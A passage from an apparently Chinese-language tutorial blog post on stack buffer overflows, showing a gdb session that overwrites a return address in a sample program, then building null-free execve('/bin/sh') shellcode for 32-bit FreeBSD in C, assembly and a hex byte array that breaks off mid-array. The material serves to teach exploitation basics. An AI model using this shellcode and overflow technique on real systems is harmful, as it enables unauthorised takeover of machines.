<span class="n">GNU</span> <span class="n">gdb</span> <span class="mi">6</span><span class="p">.</span><span class="mi">1</span><span class="p">.</span><span class="mi">1</span> <span class="p">[FreeBSD]</span>
<span class="n">Copyright</span> <span class="mi">2004</span> <span class="n">Free</span> <span class="n">Software</span> <span class="n">Foundation</span><span class="p">,</span> <span class="n">Inc</span><span class="p">.</span>
<span class="n">GDB</span> <span class="n">is</span> <span class="n">free</span> <span class="n">software</span><span class="p">,</span> <span class="n">covered</span> <span class="n">by</span> <span class="n">the</span> <span class="n">GNU</span> <span class="n">General</span> <span class="n">Public</span> <span class="n">License</span><span class="p">,</span> <span class="k">and</span> <span class="n">you</span> <span class="n">are</span>
<span class="n">welcome</span> <span class="n">to</span> <span class="n">change</span> <span class="n">it</span> <span class="k">and</span><span class="o">/</span><span class="k">or</span> <span class="n">distribute</span> <span class="n">copies</span> <span class="n">of</span> <span class="n">it</span> <span class="n">under</span> <span class="n">certain</span> <span class="n">conditions</span><span class="p">.</span>
<span class="n">Type</span> <span class="s">"show copying"</span> <span class="n">to</span> <span class="n">see</span> <span class="n">the</span> <span class="n">conditions</span><span class="p">.</span>
<span class="n">There</span> <span class="n">is</span> <span class="n">absolutely</span> <span class="n">no</span> <span class="n">warranty</span> <span class="n">for</span> <span class="n">GDB</span><span class="p">.</span>  <span class="n">Type</span> <span class="s">"show warranty"</span> <span class="n">for</span> <span class="n">details</span><span class="p">.</span>
<span class="n">This</span> <span class="n">GDB</span> <span class="n">was</span> <span class="n">configured</span> <span class="n">as</span> <span class="s">"i386-marcel-freebsd"</span><span class="p">...(</span><span class="n">no</span> <span class="n">debugging</span> <span class="n">symbols</span> <span class="n">found</span><span class="p">)...</span>
<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">disas</span> <span class="n">cpy</span>
<span class="n">Dump</span> <span class="n">of</span> <span class="n">assembler</span> <span class="n">code</span> <span class="n">for</span> <span class="n">function</span> <span class="n">cpy</span><span class="o">:</span>
<span class="mh">0x08048540</span> <span class="o">&lt;</span><span class="n">cpy</span><span class="o">+</span><span class="mi">0</span><span class="o">&gt;:</span>	<span class="k">push</span>   <span class="err">%</span><span class="n">ebp</span>
<span class="mh">0x08048541</span> <span class="o">&lt;</span><span class="n">cpy</span><span class="o">+</span><span class="mi">1</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="err">%</span><span class="n">esp</span><span class="p">,</span><span class="err">%</span><span class="n">ebp</span>
<span class="mh">0x08048543</span> <span class="o">&lt;</span><span class="n">cpy</span><span class="o">+</span><span class="mi">3</span><span class="o">&gt;:</span>	<span class="k">sub</span>    <span class="err">$</span><span class="mh">0x48</span><span class="p">,</span><span class="err">%</span><span class="n">esp</span>
<span class="mh">0x08048546</span> <span class="o">&lt;</span><span class="n">cpy</span><span class="o">+</span><span class="mi">6</span><span class="o">&gt;:</span>	<span class="k">call</span>   <span class="mh">0x8048530</span> <span class="o">&lt;</span><span class="n">get_sp</span><span class="o">&gt;</span>
<span class="mh">0x0804854b</span> <span class="o">&lt;</span><span class="n">cpy</span><span class="o">+</span><span class="mi">11</span><span class="o">&gt;:</span>	<span class="k">add</span>    <span class="err">$</span><span class="mh">0x10</span><span class="p">,</span><span class="err">%</span><span class="n">eax</span>
<span class="mh">0x0804854e</span> <span class="o">&lt;</span><span class="n">cpy</span><span class="o">+</span><span class="mi">14</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="err">%</span><span class="n">eax</span><span class="p">,</span><span class="mh">0x4</span><span class="p">(</span><span class="err">%</span><span class="n">esp</span><span class="p">)</span>
<span class="mh">0x08048552</span> <span class="o">&lt;</span><span class="n">cpy</span><span class="o">+</span><span class="mi">18</span><span class="o">&gt;:</span>	<span class="n">movl</span>   <span class="err">$</span><span class="mh">0x8048681</span><span class="p">,(</span><span class="err">%</span><span class="n">esp</span><span class="p">)</span>
<span class="mh">0x08048559</span> <span class="o">&lt;</span><span class="n">cpy</span><span class="o">+</span><span class="mi">25</span><span class="o">&gt;:</span>	<span class="k">call</span>   <span class="mh">0x80483ac</span> <span class="o">&lt;</span><span class="n">_init</span><span class="o">+</span><span class="mi">52</span><span class="o">&gt;</span>
<span class="mh">0x0804855e</span> <span class="o">&lt;</span><span class="n">cpy</span><span class="o">+</span><span class="mi">30</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="mh">0x8049840</span><span class="p">,</span><span class="err">%</span><span class="n">eax</span>
<span class="mh">0x08048563</span> <span class="o">&lt;</span><span class="n">cpy</span><span class="o">+</span><span class="mi">35</span><span class="o">&gt;:</span>	<span class="k">test</span>   <span class="err">%</span><span class="n">eax</span><span class="p">,</span><span class="err">%</span><span class="n">eax</span>
<span class="mh">0x08048565</span> <span class="o">&lt;</span><span class="n">cpy</span><span class="o">+</span><span class="mi">37</span><span class="o">&gt;:</span>	<span class="k">jne</span>    <span class="mh">0x8048599</span> <span class="o">&lt;</span><span class="n">cpy</span><span class="o">+</span><span class="mi">89</span><span class="o">&gt;</span>
<span class="mh">0x08048567</span> <span class="o">&lt;</span><span class="n">cpy</span><span class="o">+</span><span class="mi">39</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="mh">0x8049844</span><span class="p">,</span><span class="err">%</span><span class="n">eax</span>
<span class="mh">0x0804856c</span> <span class="o">&lt;</span><span class="n">cpy</span><span class="o">+</span><span class="mi">44</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="mh">0x4</span><span class="p">(</span><span class="err">%</span><span class="n">eax</span><span class="p">),</span><span class="err">%</span><span class="n">edx</span>
<span class="mh">0x0804856f</span> <span class="o">&lt;</span><span class="n">cpy</span><span class="o">+</span><span class="mi">47</span><span class="o">&gt;:</span>	<span class="k">sub</span>    <span class="err">$</span><span class="mh">0x1</span><span class="p">,</span><span class="err">%</span><span class="n">edx</span>
<span class="mh">0x08048572</span> <span class="o">&lt;</span><span class="n">cpy</span><span class="o">+</span><span class="mi">50</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="err">%</span><span class="n">edx</span><span class="p">,</span><span class="mh">0x4</span><span class="p">(</span><span class="err">%</span><span class="n">eax</span><span class="p">)</span>
<span class="mh">0x08048575</span> <span class="o">&lt;</span><span class="n">cpy</span><span class="o">+</span><span class="mi">53</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="mh">0x4</span><span class="p">(</span><span class="err">%</span><span class="n">eax</span><span class="p">),</span><span class="err">%</span><span class="n">eax</span>
<span class="mh">0x08048578</span> <span class="o">&lt;</span><span class="n">cpy</span><span class="o">+</span><span class="mi">56</span><span class="o">&gt;:</span>	<span class="k">test</span>   <span class="err">%</span><span class="n">eax</span><span class="p">,</span><span class="err">%</span><span class="n">eax</span>
<span class="mh">0x0804857a</span> <span class="o">&lt;</span><span class="n">cpy</span><span class="o">+</span><span class="mi">58</span><span class="o">&gt;:</span>	<span class="k">jns</span>    <span class="mh">0x804858b</span> <span class="o">&lt;</span><span class="n">cpy</span><span class="o">+</span><span class="mi">75</span><span class="o">&gt;</span>
<span class="mh">0x0804857c</span> <span class="o">&lt;</span><span class="n">cpy</span><span class="o">+</span><span class="mi">60</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="mh">0x8049844</span><span class="p">,</span><span class="err">%</span><span class="n">eax</span>
<span class="mh">0x08048581</span> <span class="o">&lt;</span><span class="n">cpy</span><span class="o">+</span><span class="mi">65</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="err">%</span><span class="n">eax</span><span class="p">,(</span><span class="err">%</span><span class="n">esp</span><span class="p">)</span>
<span class="mh">0x08048584</span> <span class="o">&lt;</span><span class="n">cpy</span><span class="o">+</span><span class="mi">68</span><span class="o">&gt;:</span>	<span class="k">call</span>   <span class="mh">0x80483cc</span> <span class="o">&lt;</span><span class="n">_init</span><span class="o">+</span><span class="mi">84</span><span class="o">&gt;</span>
<span class="mh">0x08048589</span> <span class="o">&lt;</span><span class="n">cpy</span><span class="o">+</span><span class="mi">73</span><span class="o">&gt;:</span>	<span class="k">jmp</span>    <span class="mh">0x80485a6</span> <span class="o">&lt;</span><span class="n">cpy</span><span class="o">+</span><span class="mi">102</span><span class="o">&gt;</span>
<span class="mh">0x0804858b</span> <span class="o">&lt;</span><span class="n">cpy</span><span class="o">+</span><span class="mi">75</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="mh">0x8049844</span><span class="p">,</span><span class="err">%</span><span class="n">eax</span>
<span class="mh">0x08048590</span> <span class="o">&lt;</span><span class="n">cpy</span><span class="o">+</span><span class="mi">80</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="p">(</span><span class="err">%</span><span class="n">eax</span><span class="p">),</span><span class="err">%</span><span class="n">edx</span>
<span class="mh">0x08048592</span> <span class="o">&lt;</span><span class="n">cpy</span><span class="o">+</span><span class="mi">82</span><span class="o">&gt;:</span>	<span class="k">add</span>    <span class="err">$</span><span class="mh">0x1</span><span class="p">,</span><span class="err">%</span><span class="n">edx</span>
<span class="mh">0x08048595</span> <span class="o">&lt;</span><span class="n">cpy</span><span class="o">+</span><span class="mi">85</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="err">%</span><span class="n">edx</span><span class="p">,(</span><span class="err">%</span><span class="n">eax</span><span class="p">)</span>
<span class="mh">0x08048597</span> <span class="o">&lt;</span><span class="n">cpy</span><span class="o">+</span><span class="mi">87</span><span class="o">&gt;:</span>	<span class="k">jmp</span>    <span class="mh">0x80485a6</span> <span class="o">&lt;</span><span class="n">cpy</span><span class="o">+</span><span class="mi">102</span><span class="o">&gt;</span>
<span class="mh">0x08048599</span> <span class="o">&lt;</span><span class="n">cpy</span><span class="o">+</span><span class="mi">89</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="mh">0x8049844</span><span class="p">,</span><span class="err">%</span><span class="n">eax</span>
<span class="mh">0x0804859e</span> <span class="o">&lt;</span><span class="n">cpy</span><span class="o">+</span><span class="mi">94</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="err">%</span><span class="n">eax</span><span class="p">,(</span><span class="err">%</span><span class="n">esp</span><span class="p">)</span>
<span class="mh">0x080485a1</span> <span class="o">&lt;</span><span class="n">cpy</span><span class="o">+</span><span class="mi">97</span><span class="o">&gt;:</span>	<span class="k">call</span>   <span class="mh">0x80483fc</span> <span class="o">&lt;</span><span class="n">_init</span><span class="o">+</span><span class="mi">132</span><span class="o">&gt;</span>
<span class="mh">0x080485a6</span> <span class="o">&lt;</span><span class="n">cpy</span><span class="o">+</span><span class="mi">102</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="mh">0x8</span><span class="p">(</span><span class="err">%</span><span class="n">ebp</span><span class="p">),</span><span class="err">%</span><span class="n">eax</span>
<span class="mh">0x080485a9</span> <span class="o">&lt;</span><span class="n">cpy</span><span class="o">+</span><span class="mi">105</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="err">%</span><span class="n">eax</span><span class="p">,</span><span class="mh">0x4</span><span class="p">(</span><span class="err">%</span><span class="n">esp</span><span class="p">)</span>
<span class="mh">0x080485ad</span> <span class="o">&lt;</span><span class="n">cpy</span><span class="o">+</span><span class="mi">109</span><span class="o">&gt;:</span>	<span class="k">lea</span>    <span class="mh">0xffffffc0</span><span class="p">(</span><span class="err">%</span><span class="n">ebp</span><span class="p">),</span><span class="err">%</span><span class="n">eax</span>
<span class="mh">0x080485b0</span> <span class="o">&lt;</span><span class="n">cpy</span><span class="o">+</span><span class="mi">112</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="err">%</span><span class="n">eax</span><span class="p">,(</span><span class="err">%</span><span class="n">esp</span><span class="p">)</span>
<span class="mh">0x080485b3</span> <span class="o">&lt;</span><span class="n">cpy</span><span class="o">+</span><span class="mi">115</span><span class="o">&gt;:</span>	<span class="k">call</span>   <span class="mh">0x80483ec</span> <span class="o">&lt;</span><span class="n">_init</span><span class="o">+</span><span class="mi">116</span><span class="o">&gt;</span>
<span class="mh">0x080485b8</span> <span class="o">&lt;</span><span class="n">cpy</span><span class="o">+</span><span class="mi">120</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="err">$</span><span class="mh">0x0</span><span class="p">,</span><span class="err">%</span><span class="n">eax</span>
<span class="mh">0x080485bd</span> <span class="o">&lt;</span><span class="n">cpy</span><span class="o">+</span><span class="mi">125</span><span class="o">&gt;:</span>	<span class="k">leave</span>  
<span class="mh">0x080485be</span> <span class="o">&lt;</span><span class="n">cpy</span><span class="o">+</span><span class="mi">126</span><span class="o">&gt;:</span>	<span class="k">ret</span>    
<span class="mh">0x080485bf</span> <span class="o">&lt;</span><span class="n">cpy</span><span class="o">+</span><span class="mi">127</span><span class="o">&gt;:</span>	<span class="k">nop</span>    
<span class="n">End</span> <span class="n">of</span> <span class="n">assembler</span> <span class="n">dump</span><span class="p">.</span>
<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">b</span> <span class="o">*</span><span class="mh">0x080485be</span>
<span class="n">Breakpoint</span> <span class="mi">1</span> <span class="n">at</span> <span class="mh">0x80485be</span>
<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">b</span> <span class="n">cpy</span>
<span class="n">Breakpoint</span> <span class="mi">2</span> <span class="n">at</span> <span class="mh">0x8048546</span>
<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">r</span> <span class="s">"\`python -c 'print "</span><span class="n">A</span><span class="s">"*80'\`"</span>
<span class="n">Starting</span> <span class="n">program</span><span class="o">:</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">guest</span><span class="o">/</span><span class="n">sample3</span> <span class="s">"\`python -c 'print "</span><span class="n">A</span><span class="s">"*80'\`"</span>
<span class="p">(</span><span class="n">no</span> <span class="n">debugging</span> <span class="n">symbols</span> <span class="n">found</span><span class="p">)...(</span><span class="n">no</span> <span class="n">debugging</span> <span class="n">symbols</span> <span class="n">found</span><span class="p">)...</span>
<span class="n">Breakpoint</span> <span class="mi">2</span><span class="p">,</span> <span class="mh">0x08048546</span> <span class="k">in</span> <span class="n">cpy</span> <span class="p">()</span>
<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span><span class="o">/</span><span class="mi">8</span><span class="n">x</span> <span class="err">$</span><span class="n">ebp</span>
<span class="mh">0xbfbfebf8</span><span class="o">:</span>	<span class="mh">0xbfbfec08</span>	<span class="mh">0x080485e1</span>	<span class="mh">0xbfbfedb0</span>	<span class="mh">0xbfbfec20</span>
<span class="mh">0xbfbfec08</span><span class="o">:</span>	<span class="mh">0xbfbfec38</span>	<span class="mh">0x080484b7</span>	<span class="mh">0x00000000</span>	<span class="mh">0x00000000</span>
<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span><span class="o">/</span><span class="mi">1</span><span class="n">s</span> <span class="mh">0xbfbfedb0</span>
<span class="mh">0xbfbfedb0</span><span class="o">:</span>	 <span class="s">""</span>
<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span><span class="o">/</span><span class="mi">1</span><span class="n">s</span> <span class="mh">0xbfbfedb0</span>
<span class="mh">0xbfbfedb0</span><span class="o">:</span>	 <span class="sc">'A'</span> <span class="o">&lt;</span><span class="n">repeats</span> <span class="mi">80</span> <span class="n">times</span><span class="o">&gt;</span>
<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">c</span>              
<span class="n">Continuing</span><span class="p">.</span>
<span class="mh">0xbfbfebb8</span>
<span class="n">Breakpoint</span> <span class="mi">1</span><span class="p">,</span> <span class="mh">0x080485be</span> <span class="k">in</span> <span class="n">cpy</span> <span class="p">()</span>
<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span><span class="o">/</span><span class="mi">8</span><span class="n">x</span> <span class="err">$</span><span class="n">esp</span>
<span class="mh">0xbfbfebfc</span><span class="o">:</span>	<span class="mh">0x41414141</span>	<span class="mh">0x41414141</span>	<span class="mh">0x41414141</span>	<span class="mh">0xbfbfec00</span>
<span class="mh">0xbfbfec0c</span><span class="o">:</span>	<span class="mh">0x080484b7</span>	<span class="mh">0x00000000</span>	<span class="mh">0x00000000</span>	<span class="mh">0xbfbfec38</span>
<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">si</span>
<span class="mh">0x41414141</span> <span class="k">in</span> <span class="o">??</span> <span class="p">()</span>
<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> 

</code></pre></div></div>

<p><img src="/img/interestingBin/QQ截图.png" alt="Alt text" /></p>

<p>要点在于：</p>
<ul>
  <li>0xbfbfebf8的值为%ebp</li>
  <li>0xbfbfebfc的值为ret_addr</li>
  <li>后面是传递给函数的参数</li>
</ul>

<p>sample3的cpy函数只有一个str函数，因此位置紧挨着ret_addr</p>

<p><img src="/img/interestingBin/1489134017439.png" alt="Alt text" /></p>

<p>此处，由于cpy中的定义buff变量溢出，因此后面的内存空间都会全部被覆盖。
0xbfbfebfc的值被改写成0x41414141，因此当程序运行到0x080485be的指令时，就会跳到0x41414141这个地址，导致Segmentation falut。若在buff中植入一些机器语言指令，然后将返回地址改为这些指令的地址，这样就可以让计算机执行任意代码。</p>

<h4 id="攻击代码示例">攻击代码示例</h4>

<p>攻击者要执行的代码叫shellcode，一般地，只要启动了<code class="highlighter-rouge">/bin/sh</code>，攻击者就能够完全控制计算机，因此shellcode指的就是一段非常短小的机器语言代码，它的功能就是<code class="highlighter-rouge">/bin/sh</code></p>

<p>例子：</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;unistd.h&gt;
</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
<span class="p">{</span>
    <span class="kt">char</span> <span class="o">*</span><span class="n">data</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>
    <span class="kt">char</span> <span class="n">sh</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"/bin/sh"</span><span class="p">;</span>

    <span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">sh</span><span class="p">;</span>
    <span class="n">data</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>

    <span class="n">execve</span><span class="p">(</span><span class="n">sh</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<blockquote>
  <p>先声明一个char型的指针型数组，然后在data[0]中存入<code class="highlighter-rouge">/bin/sh</code>字符串的指针，在data[1]中存入了NULL。由于<code class="highlighter-rouge">/bin/sh</code>不需要参数，因此data数组只需要两个元素就够。</p>
</blockquote>

<p><code class="highlighter-rouge">execv</code>的参数为下列3个：</p>
<ul>
  <li>/bin/sh字符串的指针</li>
  <li>包含传递给程序的参数在内的数组的地址</li>
  <li>环境变量</li>
</ul>

<blockquote>
  <p>此处环境变量不是必须的，因此将其设为NULL。</p>

  <p><code class="highlighter-rouge">/bin/sh</code>不需要参数，因此data指存放了<code class="highlighter-rouge">/bin/sh</code>字符串的指针</p>
</blockquote>

<p><img src="/img/interestingBin/1489134779288.png" alt="Alt text" /></p>

<p>由于sample5是采用静态链接编译的，因此execve本身也位于可执行文件内部。用gdb对execve进行反汇编，可以发现其中调用了int $0x80</p>

<p><img src="/img/interestingBin/1489134947140.png" alt="Alt text" /></p>

<p>int $0x80是一个系统调用。</p>

<p>前面的<code class="highlighter-rouge">mov $0x3b,%eax</code>指令，它的功能是将0x3b存入eax寄存器。实际上，这个值是execve系统调用的编号，系统内核会根据这个编号来识别不同的系统调用。</p>

<p>系统调用编号(usr/include/sys/syscall.h)：
<img src="/img/interestingBin/1489135179351.png" alt="Alt text" /></p>

<p>系统调用的编号:</p>
<ul>
  <li>1:exit</li>
  <li>2:fork</li>
  <li>3:read</li>
  <li>4:write</li>
</ul>

<p>以此类推，59号对应execve，将59转换为十六进制就是0x3b</p>

<p>Linux系统中，execve的编号为11。由于系统调用的编号在每个环境中不同，因此在制作shellcode的时候，需要注意。</p>

<h4 id="生成可用作shellcode的机器语言代码">生成可用作shellcode的机器语言代码</h4>

<p><img src="/img/interestingBin/shellcode.png" alt="Alt text" /></p>

<p>在调用execve的地方设置断点，确认此时内存状态。</p>

<p><img src="/img/interestingBin/1489141752365.png" alt="Alt text" /></p>

<p>execve需三个参数，分别为：</p>

<ul>
  <li>第一参数:0xbfbfebb4(/bin/sh地址)</li>
  <li>第二参数:0xbfbfebbc(/bin/sh的地址以及内容为NULL的数组)</li>
  <li>第三参数:0x00000000(NULL)</li>
</ul>

<p>已经将sample5.c所设计的样子将数据排列好。
0xbfbfebac和0xbfbfebb0与execv的调用无关，因此可以将它们删除掉，于是得到一段最低限度的内存配置</p>

<p><img src="/img/interestingBin/1489142170085.png" alt="Alt text" /></p>

<p>编写汇编代码，将上述数据写入栈当前esp以后的位置，并调用execve。</p>

<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">.</span><span class="n">globl</span> <span class="n">main</span>
<span class="n">main</span><span class="o">:</span>
    <span class="n">xorl</span>  <span class="err">%</span><span class="n">eax</span><span class="p">,</span> <span class="err">%</span><span class="n">eax</span>
    <span class="n">pushl</span> <span class="err">%</span><span class="n">eax</span>   <span class="c">;data[1](NULL)</span>
    <span class="n">movl</span>  <span class="err">%</span><span class="n">esp</span><span class="p">,</span> <span class="err">%</span><span class="n">eax</span>
    <span class="n">subl</span>  <span class="err">$</span><span class="mh">0x0c</span><span class="p">,</span><span class="err">%</span><span class="n">eax</span>
    <span class="n">pushl</span> <span class="err">%</span><span class="n">eax</span>   <span class="c">;data[0](/bin/sh地址)</span>
    <span class="n">movl</span>  <span class="err">%</span><span class="n">esp</span><span class="p">,</span> <span class="err">%</span><span class="n">ebx</span>
    <span class="n">pushl</span> <span class="err">$</span><span class="mh">0x0068732f</span> <span class="c">;字符串"/sh\0"</span>
    <span class="n">pushl</span> <span class="err">$</span><span class="mh">0x6e69622f</span>  <span class="c">;字符串"/bin"</span>
    <span class="n">movl</span>  <span class="err">%</span><span class="n">esp</span><span class="p">,</span> <span class="err">%</span><span class="n">edx</span>
    <span class="n">xorl</span>  <span class="err">%</span><span class="n">eax</span><span class="p">,</span> <span class="err">%</span><span class="n">eax</span>
    <span class="n">pushl</span> <span class="err">%</span><span class="n">eax</span>   <span class="c">;第三参数</span>
    <span class="n">pushl</span> <span class="err">%</span><span class="n">ebx</span>   <span class="c">;第二参数</span>
    <span class="n">pushl</span> <span class="err">%</span><span class="n">edx</span>   <span class="c">;第一参数</span>
    <span class="n">pushl</span> <span class="err">%</span><span class="n">eax</span>   <span class="c">;call的返回地址(可以为任意值)</span>
    <span class="n">movb</span>  <span class="err">$</span><span class="mh">0x3b</span><span class="p">,</span> <span class="err">%</span><span class="n">al</span>
    <span class="k">int</span>   <span class="err">$</span><span class="mh">0x80</span>
</code></pre></div></div>
<p>使用objdump将上面的代码转换为 机器语言。
<img src="/img/interestingBin/1489142909808.png" alt="Alt text" /></p>

<p>将机器码编译成可执行文件</p>

<p><img src="/img/interestingBin/1489143141775.png" alt="Alt text" /></p>

<p>shellcode执行成功。</p>

<blockquote>
  <p>只要将这段机器码嵌入目标程序，并设法让其执行，就能够夺取系统的控制权</p>
</blockquote>

<h4 id="对0x00的改进">对0x00的改进</h4>

<p>上面的shellcode还无法对sample3进行攻击，因为里面出现了0x00。在sample3中，复制数据时使用了strcpy函数，这个函数会用0x00来判断字符串的结尾。因此，当shellcode中间出现0x00时，strcpy就无法完整地复制shellcode地数据。</p>

<p>在sample6中，在对字符串/sh\0进行push地地方出现了0x00。</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mi">804840</span><span class="n">f</span><span class="o">:</span>	<span class="mi">68</span> <span class="mi">2</span><span class="n">f</span> <span class="mi">73</span> <span class="mi">68</span> <span class="mo">00</span>   <span class="n">push</span> <span class="err">$</span><span class="mh">0x68732f</span>
<span class="mi">8048414</span><span class="o">:</span>	<span class="mi">68</span> <span class="mi">2</span><span class="n">f</span> <span class="mi">62</span> <span class="mi">69</span> <span class="mi">6</span><span class="n">e</span>   <span class="n">push</span> <span class="err">$</span><span class="mh">0x6e69622f</span>
</code></pre></div></div>
<p>解决该问题可以采用下面办法：</p>
<ul>
  <li>将/bin/sh改为/bin//sh以凑齐8个字节</li>
  <li>在前面先push $0</li>
</ul>

<blockquote>
  <p>尽管多一个斜杠，但该命令运行不会有问题。因此，将<code class="highlighter-rouge">/sh\0</code>改为<code class="highlighter-rouge">//sh</code>，这样就成功消除了push里的<code class="highlighter-rouge">0x00</code></p>
</blockquote>

<p>用xor和push相互结合的方法，向栈中放入一个0x00作为字符串结尾的标志，这样就能避免整段代码出现<code class="highlighter-rouge">0x00</code></p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">.</span><span class="n">globl</span> <span class="n">main</span>
<span class="n">main</span><span class="o">:</span>
    <span class="n">xorl</span>  <span class="o">%</span><span class="n">eax</span><span class="p">,</span> <span class="o">%</span><span class="n">eax</span>
    <span class="n">pushl</span> <span class="o">%</span><span class="n">eax</span>
    <span class="n">movl</span>  <span class="o">%</span><span class="n">esp</span><span class="p">,</span> <span class="o">%</span><span class="n">eax</span>
    <span class="n">subl</span>  <span class="err">$</span><span class="mh">0x10</span><span class="p">,</span> <span class="o">%</span><span class="n">eax</span>
    <span class="n">pushl</span> <span class="o">%</span><span class="n">eax</span>  
    <span class="n">movl</span>  <span class="o">%</span><span class="n">esp</span><span class="p">,</span> <span class="o">%</span><span class="n">ebx</span> 
    <span class="n">xorl</span>  <span class="o">%</span><span class="n">eax</span><span class="p">,</span> <span class="o">%</span><span class="n">eax</span>  
    <span class="n">pushl</span> <span class="o">%</span><span class="n">eax</span>        <span class="p">;</span><span class="n">push</span> <span class="mh">0x00000000</span>
    <span class="n">pushl</span> <span class="err">$</span><span class="mh">0x68732f2f</span> <span class="p">;</span><span class="n">push</span><span class="err">字符串</span><span class="s">"//sh"</span>
    <span class="n">pushl</span> <span class="err">$</span><span class="mh">0x6e69622f</span> <span class="p">;</span><span class="n">push</span><span class="err">字符串</span><span class="s">"/bin"</span>
    <span class="n">movl</span>  <span class="o">%</span><span class="n">esp</span><span class="p">,</span> <span class="o">%</span><span class="n">edx</span>
    <span class="n">xorl</span>  <span class="o">%</span><span class="n">eax</span><span class="p">,</span> <span class="o">%</span><span class="n">eax</span>
    <span class="n">pushl</span> <span class="o">%</span><span class="n">eax</span>
    <span class="n">pushl</span> <span class="o">%</span><span class="n">ebx</span>
    <span class="n">pushl</span> <span class="o">%</span><span class="n">edx</span>
    <span class="n">pushl</span> <span class="o">%</span><span class="n">eax</span>
    <span class="n">movb</span>  <span class="err">$</span><span class="mh">0x3b</span><span class="p">,</span> <span class="o">%</span><span class="n">al</span>
    <span class="kt">int</span>   <span class="err">$</span><span class="mh">0x80</span>
</code></pre></div></div>
<p><img src="/img/interestingBin/1489144383415.png" alt="Alt text" /></p>

<p>sample9.c的代码：</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">shellcode</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span>
    <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0xc0</span><span class="p">,</span>                      <span class="c1">// xor %eax, %eax
</span>    <span class="mh">0x50</span><span class="p">,</span>                            <span class="c1">// push %eax
</span>    <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0xe0</span><span class="p">,</span>                      <span class="c1">// mov %esp, %eax
</span>    <span class="mh">0x83</span><span class="p">,</span> <span class="mh">0xe8</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span>                <span class="c1">// sub $0x10, %eax
</span>    <span class="mh">0x50</span><span class="p">,</span>                            <span class="c1">// push %eax
</span>    <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0xe3</span><span class="p">,</span>                      <span class="c1">// mov %esp, %ebx
</span>    <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0xc0</span><span class="p">,</span>                      <span class="c1">// xor %eax, %eax
</span>    <span class="mh">0x50</span><span class="p">,</span>                            <span class="c1">// push %eax
</span>    <span class="mh">0x68</span><span class="p">,</span> <span class="mh">0x2f</span><span class="p">,</span> <span class="mh">0x2f</span><span class="p">,</span> <span class="mh">0x73</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">,</span>    <span class="c1">// push $0x68732f2f
</span>    <span class="mh">0x68</span><span class="p">,</span> <span class="mh">0x2f</span><span class="p">,</span> <span class="mh">0x62</span><span class="p">,</span> <span class="mh">0x69</span><span class="p">,</span> <span class="mh">0x6e</span><span class="p">,</span>    <span class="c1">// push $0x6e69622f
</span>    <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0xe2</span><span class="p">,</span>                      <span class="c1">// mov %esp, %edx
</span>    <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0xc0</span><span class="p">,</span>                      <span class="c1">// xor %eax, %eax
</span>    <span class="mh">0x50</span><span class="p">,</span>                            <span class="c1">// push %eax
</span>    <span class="mh">0x53</span><span class="p">,</span>                            <span class="c1">// push %ebx
</span>    <span class="mh">0x52</span><span class="p">,</span>                            <span class="c1">// push %edx
</span>    <span class="mh">0x50</span><span class="p">,</span>                            <span class="c1">// push %eax
</span>    <span class="mh">0xb0</span><span class="p">,</span> <span class="mh">0x3b</span><span class="p">,</span>                      <span class="c1">// mov $0x3b, %al
